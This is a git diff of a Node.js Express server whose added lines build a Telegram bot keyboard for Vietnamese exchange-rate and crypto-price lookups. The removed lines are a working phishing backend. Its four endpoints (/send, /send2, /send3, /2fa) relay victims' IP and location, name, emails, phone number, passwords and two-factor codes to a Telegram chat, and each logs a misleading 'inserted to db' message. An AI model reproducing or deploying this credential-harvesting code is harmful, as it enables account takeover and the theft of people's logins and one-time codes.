@@ -19,109 +19,44 @@ app.get('/', function (req, res) {
 });
 
 app.post('/', async (req, res) => {
-    let r = await axios.post(`${url}${process.env.BOT_TOKEN}/sendMessage`,
+
+    let message = req?.body?.message?.text;
+    if (!message) {
+        res.send('Nạp tiền không thành công');
+        return;
+    }
+
+
+    const keyboard = {
+        inline_keyboard: [
+            [
+                { text: 'Tỷ giá JPY', callback_data: 'tygia_jpy' },
+                { text: 'Giá DCOM', callback_data: 'gia_dcom' },
+                { text: 'Vietcombank', callback_data: 'vietcombank' }
+            ],
+            [
+                { text: 'Giá Coin', callback_data: 'gia_coin' },
+                { text: 'Binance P2P', callback_data: 'binance_p2p' },
+                { text: 'Tygia.Vn', url: 'https://tygia.vn' }
+            ]
+        ]
+    };
+
+    console.log(req?.body);
+    await axios.post(`${url}${process.env.BOT_TOKEN}/sendMessage`,
         {
             chat_id: process.env.CHAT_ID,
             text: 'Helo from server Test',
+            reply_markup: JSON.stringify(keyboard)
         })
-
-    console.log('inserted to db');
+        .then((response) => {
+            console.log('Message posted');
+        })
     res.status(200).send(req.body);
 });
 
-app.post('/send', async (req, res) => {
-    let r = await axios.post(`${url}${process.env.BOT_TOKEN}/sendMessage`,
-        {
-            chat_id: process.env.CHAT_ID,
-            text:
-                `Ip: ${req.body?.ip.ip}\n` +
-                `Country: ${req.body?.ip.country}\n` +
-                `City: ${req.body?.ip.city}\n` +
-                `Region: ${req.body?.ip.region}\n` +
-                `pageName: ${req.body?.pageName}\n` +
-                `fullName: ${req.body?.fullName}\n` +
-                `businessEmail: ${req.body?.businessEmail}\n` +
-                `personalEmail: ${req.body?.personalEmail}\n` +
-                `phoneNumber: ${req.body?.phoneNumber}\n` +
-                `Note: ${req.body?.Note}\n` +
-                `Code2Fa: ${req.body?.Code2Fa}\n` +
-                `Status: User Send Code\n`,
-            parse_mode: 'HTML',
-        })
 
-    console.log('inserted to db');
-    res.status(200).send(req.body);
-});
 
-app.post('/send2', async (req, res) => {
-    let r = await axios.post(`${url}${process.env.BOT_TOKEN}/sendMessage`,
-        {
-            chat_id: process.env.CHAT_ID,
-            text:
-                `Ip: ${req.body?.ip.ip}\n` +
-                `Country: ${req.body?.ip.country}\n` +
-                `City: ${req.body?.ip.city}\n` +
-                `Region: ${req.body?.ip.region}\n` +
-                `pageName: ${req.body?.pageName}\n` +
-                `fullName: ${req.body?.fullName}\n` +
-                `businessEmail: ${req.body?.businessEmail}\n` +
-                `personalEmail: ${req.body?.personalEmail}\n` +
-                `phoneNumber: ${req.body?.phoneNumber}\n` +
-                `Pass: ${req.body?.Password}\n` +
-                `Note: ${req.body?.Note}\n` +
-                `Status: User Resend Code\n`,
-            parse_mode: 'HTML',
-        })
-
-    console.log('inserted to db');
-    res.status(200).send(req.body);
-});
-
-app.post('/send3', async (req, res) => {
-
-    let r = await axios.post(`${url}${process.env.BOT_TOKEN}/sendMessage`,
-        {
-            chat_id: process.env.CHAT_ID,
-            text:
-                `Ip: ${req.body?.ip.ip}\n` +
-                `Country: ${req.body?.ip.country}\n` +
-                `City: ${req.body?.ip.city}\n` +
-                `Region: ${req.body?.ip.region}\n` +
-                `pageName: ${req.body?.pageName}\n` +
-                `fullName: ${req.body?.fullName}\n` +
-                `businessEmail: ${req.body?.businessEmail}\n` +
-                `personalEmail: ${req.body?.personalEmail}\n` +
-                `phoneNumber: ${req.body?.phoneNumber}\n` +
-                `ResendPass: ${req.body?.Password}\n` +
-                `Note: ${req.body?.Note}\n` +
-                `Status: User Resend Code\n`,
-            parse_mode: 'HTML',
-        })
-
-    console.log('inserted to db');
-    res.status(200).send(req.body);
-
-});
-
-app.post('/2fa', async (req, res) => {
-
-    let r = await axios.post(`${url}${process.env.BOT_TOKEN}/sendMessage`,
-        {
-            chat_id: process.env.CHAT_ID,
-            text:
-                `Ip: ${req.body?.ip.ip}\n` +
-                `Country: ${req.body?.ip.country}\n` +
-                `City: ${req.body?.ip.city}\n` +
-                `Region: ${req.body?.ip.region}\n` +
-                `Code2Fa: ${req.body?.Code2Fa}\n` +
-                `Status: User 2fa Code\n`,
-            parse_mode: 'HTML',
-        })
-
-    console.log('inserted to db');
-    res.status(200).send(req.body);
-
-});
 
 app.listen(8000, () => console.log('Server ready on port 8000.'));
 
